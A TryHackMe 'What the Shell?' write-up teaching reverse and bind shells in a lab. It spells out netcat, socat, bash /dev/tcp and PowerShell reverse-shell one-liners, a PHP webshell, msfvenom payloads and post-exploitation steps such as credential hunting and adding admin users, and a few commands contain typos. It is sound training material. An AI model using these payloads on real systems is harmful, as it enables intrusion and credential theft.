---
title: "TryHackMe - What the Shell?"
categories:
  - Writeup
tags:
  - escalation
  - shell
  - exploit
  - writeup
  - tryhackme
  - hacking
---
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

## What is a shell?
- Shells are what we use when interfacing with a Command Line environment (CLI).
- The common `bash` or `sh` programs in Linux are examples of shells, as are `cmd.exe` and `Powershell` on Windows.
- When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to **execute arbitrary code**. When this happens, we want to use this initial access to obtain a shell running on the target.
- When attacking, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

## Tools
1. **Netcat**
    -  It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system.
    - However, Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.
1. **Socat**
    - Socat is like netcat on steroids. It can do all of the same things, and many more.
    - Socat shells are usually more stable than netcat shells out of the box.
    - It is vastly superior to netcat; however, there are two big catches:
        - The syntax is more difficult
        - Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
1. **Metasploit -- multi / handler**
    - The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.
    - `multi/handler` provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell.
    - It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads.
1. **Msfvenom**
    - `msfvenom` is technically part of the Metasploit Framework, however, it is shipped as a standalone tool.
    - Msfvenom is used to generate payloads on the fly

**Info!** Aside from the tools above, there are some repositories of shell, such a [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), etc.
{: .notice--info}

## Type of Shell
At a high level, we are interested in two kinds of shell when it comes to exploiting a target: 
- **Reverse shells** are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

Shells can be either interactive or non-interactive.
- **Interactive**: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. 
- **Non-Interactive shells** don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

#### Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?
> Reverse shells are when the target is forced to execute code that connects back to your computer. 

#### You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)
> The majority of simple reverse and bind shells are non-interactive.

#### When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
> Target, to open the port for netcat connection.

## Netcat
- Reverse Shells
    ```bash
    $ nc -lvnp <port-number>

    # -l is used to tell netcat that this will be a listener
    # -v is used to request a verbose output
    # -n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
    # -p indicates that the port specification will follow.
    ```
    **Info!** Realistically you could use any port you like, as long as there isn't already a service using it. Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.
    {: .notice--info}

    - Example if we want to listen at port 443:
        ```bash
        $ sudo nc -lvnp 443
        ```

- Bind Shells
If we are looking to obtain a bind shell on a target then we can assume that there is **already a listener waiting** for us on a chosen port of the target: all we need to do is connect to it.
```bash
$ nc <target-ip> <chosen-port>
```

#### Which option tells netcat to listen?
> `-l` is used to tell netcat that this will be a listener

How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?
```bash
# nc <target-ip> <chosen-port>
$ nc 10.10.10.11 8080
```

## Netcat Shell Stabilisation
The shells we connected into are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right.

1. **Python way**
    - The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
    - Step two is: `export TERM=xterm` -- this will give us access to term commands such as clear.
    - Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

    **Note!** if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
    {: .notice--info}

1. **rlwrap**<br>
    `rlwrap` is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. 
    - Install `rlwrap`:
    ```bash
    $ sudo apt install rlwrap
    ```
    - Use `rlwrap`:
    ```bash
    $ lwrap nc -lvnp <port>
    ```

1. **socat**<br>
    Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. Here are the steps:
    - Transfer the [socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the taget machine.
        - Step 1: Using a webserver
        ```bash
        $ sudo python3 -m http.server 80
        ```
        - Step 2: Download the shell with `curl` or `wget`
        ```bash
        $ wget <LOCAL-IP>/socat -O /tmp/socat
        $ curl <LOCAL-IP>/socat > /tmp/socat
        ```
        - For Windows
        ```powershell
        Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
        ```

    - Execute!

With any of the above techniques, it's useful to be able to change your terminal tty size.
- Open another terminal and run `stty -a`.
```bash
$ stty -a                                                                                              127 ⨯
speed 38400 baud; rows 27; columns 111; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>;
start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```
- Next, in your reverse / bind shell, type in:
```bash
$ stty rows <number>
$ sttty cols <number>
```
This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

#### How would you change your terminal size to have 238 columns?
```bash
$ stty cols 238
```

#### What is the syntax for setting up a Python3 webserver on port 80?
```bash
$ sudo python3 -m http.server 80
```

## Socat
- Reverse Shells
    - Basic:
        ```bash
        $ socat TCP-L:<port> -

        # above command is equivalen to:
        # $ nc -lvnp <port>
        ```
    - Windows machine to connect back:
        ```bash
        socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
        ```
    - Linux machine to connect back:
        ```bash
        $ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
        ```

- Bind Shells
    - Linux target:
    ```bash
    $ socat TCP-L:<PORT> EXEC:"bash -li"
    ```
    - Windows target:
    ```bash
    $ socat TCP-L:<PORT> EXEC:powershell.exe,pipes
    ```
    - Connect to target listener:
    ```bash
    $ socat TCP:<TARGET-IP>:<TARGET-PORT> -
    ```

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is **Linux**, but is significantly more stable.
```bash
$ socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
- Special command:
    ```bash
    $ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

    # pty, allocates a pseudoterminal on the target -- part of the stabilisation process
    # stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
    # sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
    # setsid, creates the process in a new session
    # sane, stabilises the terminal, attempting to "normalise" it.
    ```

**Note!** If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.
{: .notice--info}

#### How would we get socat to listen on TCP port 8080?
```bash
# socat TCP-L:<port> -

$ TCP-L:8080
```

## Socat Encrypted Shells
- Reverse Shells
    - Generate a certificate in order to use encrypted shells.
        ```bash
        $ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

        # This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
        ```
    - Merge the two created files into a single .pem file.
    ```bash
    $ cat shell.key shell.crt > shell.pem
    ```
    - Set up rever shell listener.
        ```bash
        $ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

        # verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.
        ``` 
    - Connect back.
    ```bash
    $ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
    ```

- Bind Shells
    - Target.
    ```bash
    $ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
    ```
    - Attacker
    ```bash
    $ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
    ```

**Note!** Even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
{: .notice--info}

#### What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
```bash
$ socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

#### If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
```bash
$ socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Common Shell Payloads
- Basic reverse shell
    - Listener
        ```bash
        $ nc -lvnp <PORT> -e /bin/bash
        ```
    - Connecting back
        ```bash
        $ nc <LOCAL-IP> <PORT> -e /bin/bash
        ```
        or 
        ```bash
        $ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

        # first command will creates a named pipe at /tmp/f
        ```
- Bind shell.
    - Listener
        ```bash
        $ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

        # first command will creates a named pipe at /tmp/f
        ```
    - Connecting 
        ```bash
        $ nc <TARGE-IP> <PORT>
        ```
- Standard one-liner PSH reverse shell
    - Listener
        ```bash
        $ sudo nc -lvnp <PORT>
        ```
    - Connecting
        ```powershell
        powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ```
#### What command can be used to create a named pipe in Linux?
```bash
$ mkfifo
```

## msfvenom
- Basic syntax
    ```bash
    $ msfvenom -p <PAYLOAD> <OPTIONS>
    ```
    - Example: generate a Windows x64 Reverse Shell in an .exe format:
        ```bash
        $ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

        # -f <format> Specifies the output format. In this case that is an executable (exe)
        # -o <file> The output location and filename for the generated payload.
        # LHOST=<IP> Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
        # LPORT=<port> The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
        ```

- Staged reverse shell payloads and stageless reverse shell payloads.
    - **Staged** payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and downloads the actual payload. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task. As staged payloads are denoted with another forward slash (/).
    - **Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener. Stageless payloads are denoted with underscores (_).

- Meterpreter
    - Meterpreter shells are Metasploit's own brand of fully-featured shell.
    - They are completely stable, making them a very good thing when working with Windows targets.

- Payload Naming Conventions
    - Basic convention:
        ```bash
        <OS>/<arch>/<payload>

        # Example:
        # linux/x86/shell_reverse_tcp -> This would generate a stageless reverse shell for an x86 Linux target.

        # Windows 32bit: windows/shell_reverse_tcp
        # Windows 64bit: windows/x64/meterpreter/reverse_tcp

        # / -> Staged
        # _ -> Stageless
        ```

- Listing payload:
    ```bash
    $ msfvenom --list payloads
    $ msfvenom --list payloads | grep something
    ```

#### Generate a staged reverse shell for a 64 bit Windows target, in a `.exe` format using your TryHackMe tun0 IP address and a chosen port.
```bash
$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.11.25.205 LPORT=4444
```

#### Which symbol is used to show that a shell is stageless?
> _ -> Stageless

#### What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`
```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp -f el -o shell LHOST=10.10.10.5 LPORT=443
```

## Metasploit multi/handler
Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads. How to use:
1. Open Metasploit with `msfconsole`
1. Type `use multi/handler`, and press enter
1. Type `options`, and press enter
1. Set the `PAYLOAD`, `LHOST`, and `LPORT` options.
1. Run the exploit by using `exploit -j`, `-j` will run the exploit as job in the background.
1. Check `sessions` and go to the sessions by `sessions <number>`

#### What command can be used to start a listener in the background?
```bash
exploit -j
```

#### If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
```bash
sessions 10
```

## WebShells
"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. 

- Basic PHP shell:
    ```php
    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
    ```

    This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

- Encoded Windows PS shell:
    ```powershell
    powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
    ```

## Next Steps
- For Linux, find SSH keys that usually stored id `/home/<user>/.ssh`
- For Windows, we can search credentials FileZilla at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`.
- For Windows, add our user to access RDP, telnet, etc.:
    - `net user <username> <password> /add`.
    - `net localgroup administrators <username> /add`.

## Practice and Examples
Deploy the Linux or the Windows machine first.

#### Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
- Upload our PHP webshell.
    <center><a href="/assets/images/tryhackme/whats-the-shell/1.png"><img src="/assets/images/tryhackme/whats-the-shell/1.png"></a></center>
- Set up our listener.
    ```bash
    $ nc -lnvp 9999                             
    listening on [any] 9999 ...
    ```
- Visit our webshell at `10.10.194.64/uploads/shell.php`.
- We got reverse shell.
    ```bash
    $ nc -lnvp 9999                             
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.194.64] 50542
    Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    10:28:13 up 9 min,  1 user,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    shell    pts/0    10.11.25.205     10:20    6:13   0.03s  0.03s -bash
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    ```

#### Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
- Change the IP and port.
    <center><a href="/assets/images/tryhackme/whats-the-shell/2.png"><img src="/assets/images/tryhackme/whats-the-shell/2.png"></a></center>
- Upload the shell.
    <center><a href="/assets/images/tryhackme/whats-the-shell/3.png"><img src="/assets/images/tryhackme/whats-the-shell/3.png"></a></center>
- Set up our netcat listener.
    ```bash 
    $ nc -lnvp 9999                                                                                          1 ⨯
    listening on [any] 9999 ...
    ```
- Visit our webshell.
- We got reverse shell!
    ```bash
    $ nc -lnvp 9999                                                                                          1 ⨯
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.194.64] 50544
    Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    10:34:00 up 14 min,  1 user,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    shell    pts/0    10.11.25.205     10:20   12:00   0.03s  0.03s -bash
    uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                          
    /bin/sh: 0: can't access tty; job control turned off                                                           
    $ whoami
    www-data
    ```

#### Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.
- Login over SSH.
    ```bash
    $ ssh shell@10.10.194.64
    ```
- Reverse Shell
    - Set up netcat listener on our machine.
        ```bash
        $ nc -lnvp 9999
        listening on [any] 9999 ...
        ```
    - Set up netcat reverse shell at the machine.
        ```bash
        shell@linux-shell-practice:~$ mkfifo /tmp/f; nc 10.11.25.205 9999 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
        ```
    - Got machine's shell!
        ```bash
        $ nc -lnvp 9999
        listening on [any] 9999 ...
        connect to [10.11.25.205] from (UNKNOWN) [10.10.194.64] 50546
        whoami
        shell
        ```
- Bind Shell
    - Set bind shell on the machine.
        ```bash
        shell@linux-shell-practice:~$ mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
        listening on [any] 1234 ...
        ```
    - Netcat the machine IP at port 1234 and we got shell!
        ```bash
        $ nc 10.10.194.64 1234                                                                                   1 ⨯
        whoami
        shell
        ```

#### Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
- Normal Reverse Shell
    - SSH.
    - Open our socat listener at port 9999.
        ```bash
        $ socat TCP-L:9999 -
        ```
    - Run socat reverse shell that goes into our IP and socat port.
        ```bash
        shell@linux-shell-practice:~$ socat TCP:10.11.25.205:9999 EXEC:"bash -li"
        ```
    - Success! We gain the machine shell via Reverse Shell.
        ```bash
        # our linux
        $ socat TCP-L:9999 -  
        
        whoami
        shell

        # target machine
        hell@linux-shell-practice:~$ 
        shell@linux-shell-practice:~$ whoami
        ```
- Normal Bind Shell
    - SSH.
    - Open socat bind port at target machine.
        ```bash
        shell@linux-shell-practice:~$ socat TCP-L:9999 EXEC:"bash -li"

        ```
    - Connect to target machine socat.
        ```bash
        $ socat TCP:10.10.194.64:9999 -                                                                          1 ⨯
        whoami
        shell
        ```
- Special Command
    - Open socat listener from our linux
        ```bash
        $ socat TCP-L:9999 -
        ```
    - Connect to our linux from target machine
        ```bash
        shell@linux-shell-practice:~$ socat TCP:10.11.25.205:9999 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
        ```
    - Success!
        ```bash
        $ socat TCP-L:9999 -                                                                                   130 ⨯
        shell@linux-shell-practice:~$ whoami
        whoami
        shell
        ```

#### Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.
- Using bash
    - Set up netcat listener
        ```bash
        $ nc -lnvp 9999       
        listening on [any] 9999 ...
        ```
    - Connect to our listener from target machine
        ```bash
        shell@linux-shell-practice:~$ bash -i >& /dev/tcp/10.11.25.205/9999 0>&1
        ```
    - Success!
        ```bash
        $ nc -lnvp 9999       
        listening on [any] 9999 ...
        connect to [10.11.25.205] from (UNKNOWN) [10.10.194.64] 50556
        shell@linux-shell-practice:~$
        ```

#### TODO Windows